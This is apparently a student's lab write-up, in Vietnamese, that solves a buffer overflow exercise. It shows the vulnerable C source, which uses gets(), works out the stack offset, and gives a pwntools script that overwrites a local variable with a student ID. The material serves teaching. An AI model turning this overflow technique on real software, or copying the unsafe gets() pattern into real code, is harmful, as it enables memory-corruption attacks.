# **Bonus**

## Task
File: simple_buffer, simpler_buffer.c

Chạy thử file:

```bash
└─$ ./simple-buffer
Please provide your Student ID.
Usage: ./simple-buffer <your id>

┌──(ixz㉿DESKTOP-6LQVP4S)-[/mnt/…/NT209.L21.ANTN.Group_1/Lab 5/Bonus/Lab6]
└─$ ./simple-buffer hello
hello
Almost there. My var is 305419896 now. Try harder.
```

Chạy lệnh file để kiểm tra file:

```bash
└─$ file simple-buffer
simple-buffer: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=86ff3edc7220a182a329afb121ab1691fb52205b, not stripped
```
-> File linux 32bit

## Solution

Load file bằng IDA pro 32 bit

```c
# include <stdio.h>
# include<stdlib.h>

int student_id;

void smash_my_buffer()
{
    int var = 0x12345678;
    int another_var = 0x0;

    char buf[20];
    gets(buf);

    if ((var != 0x12345678) || (another_var != 0))
	printf("You changed my local variables.\n");
    
    if (var == student_id)
	   printf("Nice works. You've changed my var to %d. That's what I need :)\n",var);
    else
 	   printf("Almost there. My var is %d now. Try harder.\n", var);
}

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
	printf("Please provide your Student ID.\nUsage: %s <your id>\n", argv[0]);
	exit(0);
    }
    
    student_id = atoi(argv[1]);
    smash_my_buffer();
}
```


đây là stack của hàm `smash_my_buffer()`

![image](https://user-images.githubusercontent.com/31529599/121875511-bd204680-cd32-11eb-95ec-95b13b22ad23.png)

Với `s` là địa chỉ của biến `buf`, `var_C` là địa chỉ của biến `var` tương ứng trong source c

vì bài này đơn giản yêu cầu chúng ta overwrite địa chỉ của biến `var` với giá trị là mã số sinh viên (`19521978`)

Theo như `stack` ở trên thì địa chỉ của biến `buf` sẽ cách địa chỉ của biến `var` là (`0x24-0xc`)

## Script python

```python
from pwn import *

binary = context.binary = ELF('./simple-buffer')

# process file thực thi với mã số sinh viên tương ứng
p = process(['./simple-buffer','19521978'])

# khoảng cách giữa biến buf và biến var theo như stack
payload = b'A'*(0x24-0xc)

# overwrite biến var với giá trị là mã số sinh viên
payload += p32(19521978)

p.sendline(payload)

p.interactive()
```

## Chạy script
![image](https://user-images.githubusercontent.com/31529599/121876334-96aedb00-cd33-11eb-9594-0793719f6bcb.png)

Xong !




